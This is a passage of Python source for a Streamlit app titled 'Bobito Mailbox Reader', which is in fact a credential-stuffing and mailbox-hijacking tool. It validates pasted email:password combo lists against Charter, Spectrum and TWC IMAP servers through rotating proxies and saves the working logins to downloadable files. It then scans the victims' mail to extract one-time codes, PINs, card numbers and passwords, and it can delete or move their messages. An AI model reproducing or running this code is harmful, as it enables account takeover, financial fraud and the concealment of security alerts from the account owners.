                    log_func(f"  ├─ [SINGLE-TERM SEARCH] Querying term: '{clean_query}' via field '{field_cmd}'")
                    typ, data = execute_imap_search_safely(mail, field_cmd, clean_query, log_func)

            log_func(f"  ├─ [IMAP SEARCH RESPONSE] Status: '{typ}' | Raw Bytes: {data}")
            ids = (data[0] or b"").split() if typ in ("OK", "OK_FALLBACK") and data else []
            
            if sort_order == "Newest First":
                ids = list(reversed(ids))

            folder_total_count = len(ids)

            start_idx = (page_number - 1) * page_size
            end_idx = start_idx + page_size
            target_ids = ids[start_idx:end_idx]

            log_func(f"  ├─ [PAGINATION RANGE] Total Matched IDs: {folder_total_count} | Processing Batch Range ({start_idx}:{end_idx}): {len(target_ids)} target IDs")

            folder_matches_count = 0

            for idx, mid in enumerate(target_ids, 1):
                msg_start = time.time()
                
                typ, msgdata = mail.fetch(mid, "(FLAGS ENVELOPE BODYSTRUCTURE BODY.PEEK[])")
                
                if not msgdata or not isinstance(msgdata[0], tuple):
                    log_func(f"  │   ├─ [Msg ID #{mid.decode()}] ⚠️ FETCH returned empty structure.")
                    continue

                raw_msg_bytes = msgdata[0][1]
                msg = message_from_bytes(raw_msg_bytes)
                subject = decode_hdr(msg.get("Subject", ""))
                frm = decode_hdr(msg.get("From", ""))
                to_hdr = decode_hdr(msg.get("To", ""))
                date_val = decode_hdr(msg.get("Date", ""))
                flags_str = str(msgdata[0][0])
                is_read = "\\Seen" in flags_str

                body_text = ""
                if msg.is_multipart():
                    for part in msg.walk():
                        if part.get_content_type() == "text/plain":
                            try:
                                body_text = part.get_payload(decode=True).decode("utf-8", errors="ignore")
                                break
                            except Exception:
                                pass
                else:
                    try:
                        body_text = msg.get_payload(decode=True).decode("utf-8", errors="ignore")
                    except Exception:
                        pass

                if is_extortion_spam(subject, body_text, frm):
                    log_func(f"  │   ├─ [Msg ID #{mid.decode()}] ⚠️ EXCLUDED: Extortion / Ransom Spam detected.")
                    continue

                cleaned_body = clean_boilerplate(body_text)
                pins, links = extract_pins_and_links(body_text)
                cards, creds = extract_credentials_and_cards(body_text)
                detected_categories = detect_specific_categories(subject, body_text, frm, pins, cards, creds)
                is_bot = len(detected_categories) > 0

                folder_matches_count += 1
                messages.append({
                    "id": mid.decode(),
                    "folder": f_label,
                    "from": frm,
                    "to": to_hdr,
                    "subject": subject,
                    "date": date_val,
                    "is_read": is_read,
                    "is_bot": is_bot,
                    "categories": detected_categories,
                    "body": cleaned_body,
                    "pins": pins,
                    "links": links,
                    "cards": cards,
                    "creds": creds,
                    "raw": raw_msg_bytes,
                    "flags": flags_str,
                    "size_bytes": len(raw_msg_bytes)
                })
                
                fetch_elapsed = round((time.time() - msg_start) * 1000, 2)
                log_func(
                    f"  │   ├─ [Msg #{idx} | ID: {mid.decode()}] Parsed in {fetch_elapsed}ms | Size: {len(raw_msg_bytes)}B | "
                    f"From: '{frm}' | To: '{to_hdr}' | Subject: '{subject}' | "
                    f"Flags: {flags_str} | Categories={detected_categories} | Pins={pins} | Cards={cards}"
                )

            total_matched_all_folders += folder_total_count
            log_func(f"  ├─ [MATCHES COUNT] Verified {folder_matches_count} matching messages in '{f_label}'.")

        except (socket.timeout, TimeoutError):
            log_func(f"  └─ ❌ [TIMEOUT ERROR] Folder '{f_label}' timed out during IMAP search.")
        except Exception as ex:
            log_func(f"  └─ ❌ [EXCEPTION ERROR] Querying folder '{f_label}' failed: {ex}")

    total_elapsed = round(time.time() - start_time, 2)
    if log_target == "SEARCH":
        st.session_state.search_total_matched_count = total_matched_all_folders
    elif log_target == "OTP":
        st.session_state.otp_total_matched_count = total_matched_all_folders
    else:
        st.session_state.total_matched_count = total_matched_all_folders

    save_session_cache()
    log_func(f"\n🏁 [ENGINE COMPLETE] Total retrieved page messages: {len(messages)} / {total_matched_all_folders} matched | Execution time: {total_elapsed}s")
    return messages


# Header
st.title("📥 Bobito Mailbox Reader & Portal Hub")
st.caption("Advanced IMAP Client with Interactive Bot Intelligence, Dedicated OTP, Debit/Credit Card & Credentials Scanner, Multi-Field Search, Telegram/Blacklist Filter, and Deep Diagnostic Instrumentation.")

valid = load_valid()

# --- Account Deletion Manager ---
with st.expander("🗑️ Account Deletion Manager", expanded=False):
    st.markdown("#### Permanent Account Deletion Options")
    clean_valid_accounts_list = [l for l in valid if not l.startswith("# Found:")]
    
    if clean_valid_accounts_list:
        del_action_mode = st.selectbox(
            "Select Deletion Mode", 
            ["-- Choose Action --", "Delete Selected Valid Account(s)", "Delete ALL Valid Accounts"], 
            key="del_action_mode_sel"
        )
        
        if del_action_mode == "Delete Selected Valid Account(s)":
            if "select_all_accounts_chk" not in st.session_state:
                st.session_state.select_all_accounts_chk = False
                
            def toggle_select_all():
                if st.session_state.select_all_accounts_chk:
                    st.session_state.accounts_to_del_multiselect = clean_valid_accounts_list
                else:
                    st.session_state.accounts_to_del_multiselect = []

            col_sel1, col_sel2 = st.columns([3, 1])
            with col_sel2:
                st.markdown("<br>", unsafe_allow_html=True)
                st.checkbox("Select All", key="select_all_accounts_chk", on_change=toggle_select_all)
            
            with col_sel1:
                selected_accounts_to_delete = st.multiselect(
                    "Select Account(s) to Permanently Delete", 
                    clean_valid_accounts_list, 
                    key="accounts_to_del_multiselect"
                )
            
            if selected_accounts_to_delete:
                if st.button("🗑️ Permanently Delete Selected Account(s)", type="primary", use_container_width=True):
                    for acc in selected_accounts_to_delete:
                        delete_specific_account_from_storage(acc)
                    st.success(f"Permanently deleted {len(selected_accounts_to_delete)} account(s)!")
                    save_session_cache()
                    st.rerun()
                
        elif del_action_mode == "Delete ALL Valid Accounts":
            st.warning("⚠️ Warning: This will permanently remove all stored valid accounts from local record files!")
            confirm_all = st.checkbox("I confirm I want to delete ALL valid accounts permanently", key="confirm_del_all_checkbox")
            if confirm_all:
                if st.button("🚨 Permanently Delete ALL Accounts", type="primary", use_container_width=True):
                    clear_all_valid_accounts_storage()
                    st.success("Permanently deleted all valid accounts!")
                    save_session_cache()
                    st.rerun()
    else:
        st.caption("No valid accounts currently available for deletion.")

# --- Keyboard Search & Filter Box ---
account_filter_query = st.text_input("🔍 Filter Valid Accounts (Type to search with keyboard)", placeholder="Type email, domain, or timestamp...").strip().lower()

if account_filter_query:
    filtered_options = []
    i = 0
    while i < len(valid):
        item = valid[i]
        if item.startswith("# Found:"):
            if i + 1 < len(valid) and account_filter_query in valid[i+1].lower():
                filtered_options.append(item)
                filtered_options.append(valid[i+1])
            i += 2
        else:
            if account_filter_query in item.lower():
                filtered_options.append(item)
            i += 1
    valid_dropdown_options = filtered_options if filtered_options else ["none"]
else:
    valid_dropdown_options = valid if valid else ["none"]

default_index = 0

if "forced_account" in st.session_state and st.session_state.forced_account in valid_dropdown_options:
    default_index = valid_dropdown_options.index(st.session_state.forced_account)
else:
    last_acc = load_last_account()
    if last_acc in valid_dropdown_options:
        default_index = valid_dropdown_options.index(last_acc)

pick = st.selectbox("Valid account", valid_dropdown_options, index=default_index, key="selected_account")

actual_pick = "none"
if pick and pick != "none":
    if pick.startswith("# Found:"):
        st.warning("Please select the email:password combo below the timestamp (timestamps are non-clickable labels).")
        actual_pick = "none"
    else:
        actual_pick = pick.strip()

if actual_pick and actual_pick != "none" and ":" in actual_pick:
    save_last_account(actual_pick)
    save_session_cache()

st.sidebar.header("Account & Connection Hub")

if valid:
    clean_download_lines = [line for line in valid if not line.startswith("# Found:")]
    valid_text_data = "\n".join(clean_download_lines)
    st.sidebar.download_button(
        label="📥 Download Valid Mail List",
        data=valid_text_data,
        file_name=f"valid_accounts_{len(clean_download_lines)}.txt",
        mime="text/plain",
        use_container_width=True
    )

    zip_bytes = generate_all_mail_zip()
    st.sidebar.download_button(
        label="📦 Download All Mail Lists (ZIP)",
        data=zip_bytes,
        file_name="all_mail_results_bundle.zip",
        mime="application/zip",
        use_container_width=True
    )

# App Configuration Settings Drawer
with st.sidebar.expander("⚙️ App Configuration Settings", expanded=False):
    cfg = st.session_state.app_config
    
    new_timeout = st.number_input("Connection Timeout (seconds)", min_value=5, max_value=300, value=cfg.get("connection_timeout", 15))
    new_port = st.number_input("Default IMAP Port", min_value=1, max_value=65535, value=cfg.get("imap_port", 993))
    new_fallback = st.checkbox("Enable Auto-Fallback Host Probing (Spectrum/Charter/TWC)", value=cfg.get("auto_fallback_probing", True))
    
    if st.button("💾 Save App Settings", type="secondary", use_container_width=True):
        st.session_state.app_config["connection_timeout"] = new_timeout
        st.session_state.app_config["imap_port"] = new_port
        st.session_state.app_config["auto_fallback_probing"] = new_fallback
        save_app_config(st.session_state.app_config)
        st.success("App configuration updated and saved globally!")

# Batch Account Importer & Validator Bar
st.sidebar.markdown("---")
st.sidebar.subheader("📋 Batch Account Importer & Validator")
batch_paste_input = st.sidebar.text_area(
    "Paste Multiple Accounts (email:pass)", 
    key="batch_paste_text", 
    placeholder="user1@charter.net:pass1\nuser2@spectrum.net:pass2",
    height=110
)
batch_host_override_input = st.sidebar.text_area(
    "Batch IMAP Host Overrides (comma, semicolon or newline separated)", 
    key="batch_host_ov", 
    placeholder="mobile.charter.net\nimap.spectrum.net",
    height=80
)

if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", use_container_width=True):
    lines = [l.strip() for l in batch_paste_input.splitlines() if l.strip() and not l.strip().startswith("#")]
    if not lines:
        st.sidebar.error("Please paste at least one account in email:password format.")
    else:
        batch_logs = []
        table_rows = []
        valid_count = 0
        wrong_count = 0
        appass_count = 0
        failed_count = 0
        
        progress_bar = st.sidebar.progress(0)
        status_display = st.sidebar.empty()
        
        start_run_time = datetime.now()
        start_time_str = start_run_time.strftime("%Y-%m-%d %H:%M:%S")
        timestamp_str = f"# Started:{start_time_str}"
        new_valid_entries = [timestamp_str]
        
        cfg_timeout = st.session_state.app_config.get("connection_timeout", 15)
        cfg_port = st.session_state.app_config.get("imap_port", 993)
        cfg_fallback = st.session_state.app_config.get("auto_fallback_probing", True)
        
        user_host_overrides = [h.strip() for h in re.split(r'[,;\n]+', batch_host_override_input) if h.strip()]
        active_proxy_pool = load_app_proxies()
        
        for idx, line in enumerate(lines):
            clean_line = line.split("|")[0].strip()
            row_time = datetime.now().strftime("%H:%M:%S")
            proxy_item = active_proxy_pool[idx % len(active_proxy_pool)]
            
            if ":" not in clean_line:
                failed_count += 1
                batch_logs.append(f"❌ [{row_time}] [SKIPPED] Invalid format: {line}")
                table_rows.append({
                    "Time": row_time,
                    "Status": "FAILED",
                    "Email:Password": line,
                    "Under-The-Hood Background Trace": f"Proxy: {proxy_item['proxy']} | Country: {proxy_item['country']} | Region: {proxy_item['region']} | Result: Invalid format (missing colon delimiter)"
                })
                continue
            
            email_val, pass_val = clean_line.split(":", 1)
            email_val = email_val.strip()
            pass_val = pass_val.strip()
            
            status_display.text(f"Testing ({idx+1}/{len(lines)}): {email_val} via {proxy_item['proxy']}")
            progress_bar.progress((idx + 1) / len(lines))
            
            if user_host_overrides:
                hosts_to_test = list(user_host_overrides)
                for h in host_list(email_val):
                    if h not in hosts_to_test:
                        hosts_to_test.append(h)
            else:
                hosts_to_test = host_list(email_val)
                if cfg_fallback:
                    domain_lower = email_val.split("@")[-1].lower() if "@" in email_val else ""
                    if "charter" in domain_lower:
                        hosts_to_test = ["mobile.charter.net", "imap.charter.net"] + hosts_to_test
                    elif "spectrum" in domain_lower:
                        hosts_to_test = ["imap.spectrum.net", "mail.spectrum.net"] + hosts_to_test
                    elif "twc" in domain_lower:
                        hosts_to_test = ["mail.twc.com"] + hosts_to_test

            is_success = False
            status_type = "FAILED"
            connected_h = ""
            err_msg = ""
            trace_steps = []
            
            for h in hosts_to_test:
                test_m = None
                try:
                    trace_steps.append(f"Attempting IMAP -> Host: {h}:{cfg_port}")
                    test_m = open_imap(h, cfg_port, cfg_timeout, proxy_item.get("proxy"))
                    test_m.login(email_val, pass_val)
                    test_m.logout()
                    connected_h = h
                    is_success = True
                    status_type = "VALID"
                    trace_steps.append(f"Successfully authenticated against {h}:{cfg_port}")
                    break
                except Exception as ex:
                    err_msg = str(ex)
                    trace_steps.append(f"Failed {h}: {err_msg}")
                    if test_m:
                        try:
                            test_m.logout()
                        except Exception:
                            pass
            
            full_trace = f"Proxy: {proxy_item['proxy']} | Country: {proxy_item['country']} | Region: {proxy_item['region']} | Host: {connected_h or hosts_to_test[0]} | Port: {cfg_port} | Steps Executed: " + " | ".join(trace_steps)
            
            if is_success:
                valid_count += 1
                found_timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                combo_str = f"{email_val}:{pass_val}"
                new_valid_entries.append(f"{combo_str} | Found: {found_timestamp}")
                batch_logs.append(f"✅ [{row_time}] [VALID] {email_val} via {connected_h} [Proxy: {proxy_item['proxy']} ({proxy_item['country']}, {proxy_item['region']})]")
            else:
                err_lower = err_msg.lower()
                if any(x in err_lower for x in ["auth", "login", "credentials", "credential"]):
                    wrong_count += 1
                    status_type = "WRONG"
                    batch_logs.append(f"❌ [{row_time}] [WRONG] {email_val} — {err_msg}")
                elif any(x in err_lower for x in ["app password", "2fa", "two-factor", "mfa"]):
                    appass_count += 1
                    status_type = "APPASS"
                    batch_logs.append(f"🔑 [{row_time}] [APPASS] {email_val} — {err_msg}")
                else:
                    failed_count += 1
                    status_type = "FAILED"
                    batch_logs.append(f"⚠️ [{row_time}] [FAILED] {email_val} — {err_msg}")

            table_rows.append({
                "Time": row_time,
                "Status": status_type,
                "Email:Password": f"{email_val}:{pass_val}",
                "Under-The-Hood Background Trace": full_trace
            })
        
        progress_bar.empty()
        status_display.empty()
        
        end_run_time = datetime.now()
        duration_delta = end_run_time - start_run_time
        dur_str = str(duration_delta).split(".")[0]
        if len(dur_str) == 5:
            dur_str = f"0:{dur_str}"
        
        st.session_state.batch_run_meta = {
            "started": start_time_str,
            "ended": end_run_time.strftime("%Y-%m-%d %H:%M:%S"),
            "duration": dur_str
        }
        
        st.session_state.batch_stats = {
            "valid": valid_count,
            "wrong": wrong_count,
            "appass": appass_count,
            "failed": failed_count
        }
        st.session_state.batch_results_table = table_rows
        st.session_state.batch_validation_logs = batch_logs
        
        if valid_count > 0:
            block_content = "\n".join(new_valid_entries) + "\n\n"
            existing_data = ""
            if os.path.exists("clean_valid_accounts.txt"):
                with open("clean_valid_accounts.txt", "r", encoding="utf-8", errors="ignore") as f:
                    existing_data = f.read()
            
            with open("clean_valid_accounts.txt", "w", encoding="utf-8") as f:
                f.write(block_content + existing_data)
        
        save_session_cache()
        st.sidebar.success(f"Batch validation complete! Valid: {valid_count}, Invalid/Failed: {failed_count + wrong_count}")
        st.rerun()

# Live Execution Stream & Analytics Dashboard
st.markdown("---")
tab_stream, tab_analytics = st.tabs(["⚡ Live Execution Stream", "📊 Live Report Log & Analytics"])

with tab_stream:
    if "batch_validation_logs" in st.session_state and st.session_state.batch_validation_logs:
        st.code("\n".join(st.session_state.batch_validation_logs), language="text")
    else:
        st.caption("No batch validation execution logs recorded yet. Run a batch validation from the sidebar.")

with tab_analytics:
    meta = st.session_state.get("batch_run_meta")
    if meta:
        st.success(f"🎉 Check Complete! Started: {meta['started']} | Ended: {meta['ended']} | Duration: {meta['duration']}")
    
    stats = st.session_state.batch_stats
    a_col1, a_col2, a_col3, a_col4 = st.columns(4)
    with a_col1:
        st.metric("✅ Valid", stats["valid"])
    with a_col2:
        st.metric("❌ Wrong", stats["wrong"])
    with a_col3:
        st.metric("🔑 AppPass", stats["appass"])
    with a_col4:
        st.metric("⚠️ Failed", stats["failed"])
    
    st.markdown("#### Detailed Execution Log Table")
    if st.session_state.batch_results_table:
        st.dataframe(
            st.session_state.batch_results_table,
            column_order=("Time", "Status", "Email:Password", "Under-The-Hood Background Trace"),
            use_container_width=True,
            hide_index=True
        )
    else:
        st.caption("No table results available yet.")

st.sidebar.markdown("---")

st.sidebar.text_input("Email override", key="custom_email")
st.sidebar.text_input("Password override", type="password", key="custom_pass")
st.sidebar.text_input("IMAP host override", key="custom_host")

if st.sidebar.button("🔑 Login & Save Account", type="primary", use_container_width=True):
    c_email = st.session_state.custom_email.strip()
    c_pass = st.session_state.custom_pass.strip()
    c_override = st.session_state.custom_host.strip()
    if not c_email or not c_pass:
        st.sidebar.error("Please enter both Email and Password override.")
    else:
        domain_lower = c_email.split("@")[-1].lower() if "@" in c_email else ""
        if c_override:
            hosts = [c_override]
        else:
            hosts = host_list(c_email)
            if st.session_state.app_config.get("auto_fallback_probing", True):
                if "charter" in domain_lower:
                    hosts = ["mobile.charter.net", "imap.charter.net"] + hosts
                elif "spectrum" in domain_lower:
                    hosts = ["imap.spectrum.net", "mail.spectrum.net"] + hosts
                elif "twc" in domain_lower:
                    hosts = ["mail.twc.com"] + hosts

        success, connected_host, discovered_folders = False, "", ["INBOX"]
        last_err = ""
        test_mail = None
        
        with st.spinner("Connecting, authenticating & discovering folders..."):
            for host in hosts:
                try:
                    active_proxies = load_app_proxies()
                    proxy_str = active_proxies[0].get("proxy") if active_proxies else None
                    test_mail = open_imap(host, st.session_state.app_config.get("imap_port", 993), st.session_state.app_config.get("connection_timeout", 15), proxy_str=proxy_str)
                    test_mail.login(c_email, c_pass)
                    discovered_folders = list_folders(test_mail, email_addr=c_email, host_val=host)
                    connected_host = host
                    success = True
                    break
                except Exception as ex:
                    last_err = f"{host}: {ex}"
                    if test_mail:
                        try:
                            test_mail.logout()
                        except Exception:
                            pass
        
        if success:
            combo = f"{c_email}:{c_pass}"
            
            if st.session_state.active_mail and st.session_state.get("connected_account_combo") != combo:
                try:
                    st.session_state.active_mail.logout()
                except Exception:
                    pass
            
            st.session_state.active_mail = test_mail
            st.session_state.connected_account_combo = combo
            
            found_timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            new_entry_line = f"{combo} | Found: {found_timestamp}\n"
            
            existing_content = ""
            if os.path.exists(MANUAL_VALID_FILE):
                with open(MANUAL_VALID_FILE, "r", encoding="utf-8", errors="ignore") as f:
                    existing_content = f.read()
            
            with open(MANUAL_VALID_FILE, "w", encoding="utf-8") as f:
                f.write(new_entry_line + existing_content)
            
            save_last_account(combo)
            st.session_state.forced_account = combo
            st.session_state.mb_host = connected_host
            st.session_state.mb_folders = discovered_folders
            save_session_cache()
            st.sidebar.success(f"Connected: {connected_host} ({len(discovered_folders)} folders)")
            st.rerun()
        else:
            st.sidebar.error(f"❌ Login failed: {last_err}")

active_email, active_password = "", ""
if actual_pick != "none" and ":" in actual_pick:
    active_email, active_password = actual_pick.split(":", 1)

override = st.session_state.custom_host.strip()

if st.sidebar.button("🔄 Refresh Inbox", type="secondary", use_container_width=True):
    if active_email and active_password:
        domain_lower = active_email.split("@")[-1].lower() if "@" in active_email else ""
        default_hosts = host_list(active_email)
        if st.session_state.app_config.get("auto_fallback_probing", True):
            if "charter" in domain_lower:
                default_hosts = ["mobile.charter.net", "imap.charter.net"] + default_hosts
            elif "spectrum" in domain_lower:
                default_hosts = ["imap.spectrum.net", "mail.spectrum.net"] + default_hosts
            elif "twc" in domain_lower:
                default_hosts = ["mail.twc.com"] + default_hosts
        host = override or st.session_state.mb_host or (default_hosts[:1] or [""])[0]
        try:
            with st.spinner("Refreshing Inbox..."):
                mail_obj = get_active_mail(active_email, active_password, host)
                st.session_state.current_messages = fetch_messages_paginated(
                    mail_obj, active_email, active_password, host, ["INBOX"], mode="FOLDER_ONLY", 
                    page_size=15, page_number=1, sort_order="Newest First", log_target="DEBUG"
                )
                st.session_state.current_page = 1
                st.session_state.bot_filter_mode = False
                save_session_cache()
                st.sidebar.success("Inbox refreshed successfully!")
        except Exception as e:
            st.sidebar.error(f"Refresh failed: {e}")

if active_email and active_password:
    st.sidebar.markdown("---")
    st.sidebar.subheader("🌐 Webmail Portal & Credentials")
    portal_url = get_webmail_portal(active_email)
    st.sidebar.markdown(f"[Open Webmail Portal]({portal_url})", unsafe_allow_html=True)
    st.sidebar.text_input("Copy Credentials", value=f"{active_email}:{active_password}")

if st.button("Connect & Discover Folders", type="primary", use_container_width=True):
    if actual_pick == "none" or not actual_pick or ":" not in actual_pick:
        st.error("Please select a valid account from the dropdown list first.")
    else:
        acc_email, acc_pass = actual_pick.split(":", 1)
        domain_lower = acc_email.split("@")[-1].lower() if "@" in acc_email else ""
        hosts = host_list(acc_email)
        if st.session_state.app_config.get("auto_fallback_probing", True):
            if "charter" in domain_lower:
                hosts = ["mobile.charter.net", "imap.charter.net"] + hosts
            elif "spectrum" in domain_lower:
                hosts = ["imap.spectrum.net", "mail.spectrum.net"] + hosts
            elif "twc" in domain_lower:
                hosts = ["mail.twc.com"] + hosts

        last, connected_host, folders, success = "no host", "", ["INBOX"], False
        test_mail = None

        with st.spinner(f"Connecting to {acc_email} and discovering folders..."):
            for host in hosts:
                try:
                    active_proxies = load_app_proxies()
                    proxy_str = active_proxies[0].get("proxy") if active_proxies else None
                    test_mail = open_imap(host, st.session_state.app_config.get("imap_port", 993), st.session_state.app_config.get("connection_timeout", 15), proxy_str=proxy_str)
                    test_mail.login(acc_email, acc_pass)
                    folders = list_folders(test_mail, email_addr=acc_email, host_val=host)
                    connected_host = host
                    success = True
                    break
                except Exception as e:
                    last = f"{host}: {e}"
                    if test_mail:
                        try:
                            test_mail.logout()
                        except Exception:
                            pass

        if success:
            combo = f"{acc_email}:{acc_pass}"
            if st.session_state.active_mail and st.session_state.get("connected_account_combo") != combo:
                try:
                    st.session_state.active_mail.logout()
                except Exception:
                    pass
            
            st.session_state.active_mail = test_mail
            st.session_state.connected_account_combo = combo
            st.session_state.mb_host = connected_host
            st.session_state.mb_folders = folders
            save_session_cache()
            log(f"Discovered {len(folders)} folders via {connected_host}")
            st.success(f"Connected: {connected_host} ({len(folders)} folders)")
        else:
            st.error(last)

if st.session_state.folder_debug_logs:
    with st.expander("🛠️ Folder Discovery Diagnostic Traces", expanded=False):
        st.code("\n".join(st.session_state.folder_debug_logs), language="text")

col1, col2, col3 = st.columns([2, 1, 1])
with col1:
    folder = st.selectbox("Select Mail Folder", st.session_state.mb_folders)
with col2:
    page_size = st.slider("Page size", 5, 200, 15)
with col3:
    sort_order = st.selectbox("Sort Order", ["Newest First", "Oldest First"])

if st.button("📂 Load Folder Messages", type="primary", use_container_width=True):
    domain_lower = active_email.split("@")[-1].lower() if "@" in active_email else ""
    default_hosts = host_list(active_email)
    if st.session_state.app_config.get("auto_fallback_probing", True):
        if "charter" in domain_lower:
            default_hosts = ["mobile.charter.net", "imap.charter.net"] + default_hosts
        elif "spectrum" in domain_lower:
            default_hosts = ["imap.spectrum.net", "mail.spectrum.net"] + default_hosts
        elif "twc" in domain_lower:
            default_hosts = ["mail.twc.com"] + default_hosts
    host = override or st.session_state.mb_host or (default_hosts[:1] or [""])[0]
    if not active_email or not active_password or not host:
        st.error("Please connect and load folders first.")
    else:
        try:
            with st.spinner(f"Loading folder '{folder}'..."):
                mail = get_active_mail(active_email, active_password, host)
                msgs = fetch_messages_paginated(
                    mail, active_email, active_password, host, [folder], mode="FOLDER_ONLY",
                    page_size=page_size, page_number=1, sort_order=sort_order, log_target="DEBUG"
                )
                st.session_state.current_messages = msgs
                st.session_state.current_page = 1
                st.session_state.bot_filter_mode = False
                save_session_cache()
                log(f"Loaded {len(msgs)} messages from folder '{folder}'.")
        except Exception as e:
            st.error(str(e))

# Main Message Stream
if st.session_state.bot_filter_mode:
    active_msgs = [m for m in st.session_state.current_messages if m["is_bot"]]
    st.info("⚠️ Message stream is currently filtered to show DETECTED BOT/SPAM/TELEGRAM/BLACKLIST MESSAGES ONLY.")
else:
    active_msgs = st.session_state.current_messages

total_msgs = st.session_state.total_matched_count or len(active_msgs)

if len(active_msgs) > 0:
    st.markdown("---")
    
    total_pages = max(1, math.ceil(total_msgs / page_size))
    curr_p = st.session_state.current_page
    
    with st.expander(f"✉️ Main Message Stream — Page {curr_p} of {total_pages} ({total_msgs} Total Matches)", expanded=False):
        st.markdown(f"**Showing Page {curr_p} of {total_pages} (Total Server Matches: {total_msgs})**")

        for idx, msg in enumerate(active_msgs):
            status_icon = "📖" if msg["is_read"] else "📩"
            cat_list = msg.get("categories", [])
            cat_badge = f" [{' '.join(cat_list)}]" if cat_list else ""
            folder_badge = f" [{msg['folder']}]"

            with st.expander(f"{status_icon}{folder_badge} [{msg['date']}] {msg['from']} - {msg['subject']}{cat_badge}", expanded=False):
                st.write(f"**Folder:** {msg['folder']}")
                st.write(f"**From:** {msg['from']}")
                st.write(f"**To:** {msg['to']}")
                st.write(f"**Subject:** {msg['subject']}")
                st.write(f"**Date:** {msg['date']}")
                st.write(f"**IMAP Message ID:** {msg['id']} | **Size:** {msg['size_bytes']} bytes")

                if msg.get("categories"):
                    st.info(f"🏷️ **Detected Classifications:** {' | '.join(msg['categories'])}")
                if msg["pins"]:
                    st.success(f"🔑 **Extracted PINs / Verification Codes:** {', '.join(msg['pins'])}")
                if msg.get("cards"):
                    st.warning(f"💳 **Detected Debit / Credit Card / Transaction Details:** {', '.join(msg['cards'])}")
                if msg.get("creds"):
                    st.info(f"🔒 **Extracted Login/Credential Passwords:** {', '.join(msg['creds'])}")
                if msg["links"]:
                    st.markdown("🔗 **Actionable Verification Links:**")
                    for link in msg["links"]:
                        st.markdown(f"- [{link}]({link})", unsafe_allow_html=True)

                st.markdown("---")
                st.text_area("Cleaned Message Body", value=msg["body"], height=150, key=f"body_{msg['folder']}_{msg['id']}_{idx}")

                op_col1, op_col2, op_col3, op_col4 = st.columns(4)
                domain_lower = active_email.split("@")[-1].lower() if "@" in active_email else ""
                default_hosts = host_list(active_email)
                if st.session_state.app_config.get("auto_fallback_probing", True):
                    if "charter" in domain_lower:
                        default_hosts = ["mobile.charter.net", "imap.charter.net"] + default_hosts
                    elif "spectrum" in domain_lower:
                        default_hosts = ["imap.spectrum.net", "mail.spectrum.net"] + default_hosts
                    elif "twc" in domain_lower:
                        default_hosts = ["mail.twc.com"] + default_hosts
                host = override or st.session_state.mb_host or (default_hosts[:1] or [""])[0]
                real_imap_folder = get_imap_path(msg['folder'])
                real_imap_encoded = encode_imap_utf7(real_imap_folder)

                with op_col1:
                    if not msg["is_read"]:
                        if st.button("Mark as Read", key=f"read_{msg['folder']}_{msg['id']}_{idx}"):
                            try:
                                m_client = get_active_mail(active_email, active_password, host)
                                m_client.select(f'"{real_imap_encoded}"', readonly=False)
                                m_client.store(msg["id"], '+FLAGS', '\\Seen')
                                msg["is_read"] = True
                                save_session_cache()
                                st.success("Marked as read!")
                                st.rerun()
                            except Exception as ex:
                                st.error(str(ex))

                with op_col2:
                    target_move = st.selectbox("Move to", st.session_state.mb_folders, key=f"mv_sel_{msg['folder']}_{msg['id']}_{idx}")
                    if st.button("Move Message", key=f"mv_btn_{msg['folder']}_{msg['id']}_{idx}"):
                        try:
                            real_target_path = get_imap_path(target_move)
                            real_target_encoded = encode_imap_utf7(real_target_path)
                            m_client = get_active_mail(active_email, active_password, host)
                            m_client.select(f'"{real_target_encoded}"', readonly=False)
                            m_client.copy(msg["id"], f'"{real_target_encoded}"')
                            m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                            m_client.expunge()
                            st.session_state.current_messages.remove(msg)
                            save_session_cache()
                            st.success(f"Moved to {target_move}!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with op_col3:
                    del_label = "Delete Bot Msg" if msg["is_bot"] else "Delete Message"
                    if st.button(del_label, key=f"del_{msg['folder']}_{msg['id']}_{idx}", type="primary" if msg["is_bot"] else "secondary"):
                        try:
                            m_client = get_active_mail(active_email, active_password, host)
                            m_client.select(f'"{real_imap_encoded}"', readonly=False)
                            m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                            m_client.expunge()
                            st.session_state.current_messages.remove(msg)
                            save_session_cache()
                            st.success("Deleted message!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with op_col4:
                    with st.popover("View Raw RFC822"):
                        st.code(msg.get("raw", b"").decode("utf-8", errors="ignore"))

        st.markdown("---")
        p_col1, p_col2, p_col3 = st.columns([1, 2, 1])

        with p_col1:
            if st.button("Previous Page", disabled=(curr_p <= 1), use_container_width=True, key="msg_stream_prev"):
                st.session_state.current_page -= 1
                domain_lower = active_email.split("@")[-1].lower() if "@" in active_email else ""
                default_hosts = host_list(active_email)
                if st.session_state.app_config.get("auto_fallback_probing", True):
                    if "charter" in domain_lower:
                        default_hosts = ["mobile.charter.net", "imap.charter.net"] + default_hosts
                    elif "spectrum" in domain_lower:
                        default_hosts = ["imap.spectrum.net", "mail.spectrum.net"] + default_hosts
                    elif "twc" in domain_lower:
                        default_hosts = ["mail.twc.com"] + default_hosts
                host = override or st.session_state.mb_host or (default_hosts[:1] or [""])[0]
                mail = get_active_mail(active_email, active_password, host)
                st.session_state.current_messages = fetch_messages_paginated(
                    mail, active_email, active_password, host, [folder], 
                    mode="FOLDER_ONLY",
                    page_size=page_size, page_number=st.session_state.current_page, sort_order=sort_order,
                    log_target="DEBUG"
                )
                save_session_cache()
                st.rerun()

        with p_col2:
            st.markdown(f"<h4 style='text-align: center; margin: 0;'>Page {curr_p} of {total_pages}</h4>", unsafe_allow_html=True)

        with p_col3:
            if st.button("Next Page", disabled=(curr_p >= total_pages), use_container_width=True, key="msg_stream_next"):
                st.session_state.current_page += 1
                domain_lower = active_email.split("@")[-1].lower() if "@" in active_email else ""
                default_hosts = host_list(active_email)
                if st.session_state.app_config.get("auto_fallback_probing", True):
                    if "charter" in domain_lower:
                        default_hosts = ["mobile.charter.net", "imap.charter.net"] + default_hosts
                    elif "spectrum" in domain_lower:
                        default_hosts = ["imap.spectrum.net", "mail.spectrum.net"] + default_hosts
                    elif "twc" in domain_lower:
                        default_hosts = ["mail.twc.com"] + default_hosts
                host = override or st.session_state.mb_host or (default_hosts[:1] or [""])[0]
                mail = get_active_mail(active_email, active_password, host)
